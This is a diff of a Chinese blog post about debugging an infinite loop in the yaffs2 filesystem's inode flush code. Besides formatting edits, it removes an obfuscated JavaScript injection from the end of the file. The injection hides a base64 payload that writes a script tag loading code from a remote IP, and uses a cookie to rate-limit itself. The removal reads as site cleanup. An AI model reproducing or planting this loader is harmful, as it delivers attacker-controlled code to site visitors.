@@ -3,8 +3,9 @@ title: 定位的一个yaffs2文件系统的bug
 tags: []
 id: '453'
 categories:
-  - - linux
-    - 文件系统
+  - 操作系统
+  - linux
+  - 文件系统
 date: 2019-06-02 06:17:43
 ---
 
@@ -20,6 +21,7 @@ yaffs代码在yaffs_flus_inodes函数中出现死循环:
 
 调用栈为:sys_sync-->sync_filesystems-->yaffs_sync_fs->yaffs_do_sync_fs-->yaffs_flush_super-->yaffs_flush_inodes
 
+```c
 static void yaffs_flush_inodes(struct super_block *sb)  
 {  
     struct inode *iptr;  
@@ -34,6 +36,7 @@ static void yaffs_flush_inodes(struct super_block *sb)
         }  
     }  
 }
+```
 
 原因分析:
 
@@ -65,5 +68,3 @@ sys_unlink-->do_unlinkat-->iput-->iput_final-->generic_drop_inode-->list_del_ini
 来源：CSDN  
 原文：https://blog.csdn.net/happyAnger6/article/details/50768536  
 版权声明：本文为博主原创文章，转载请附上博文链接！
-
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
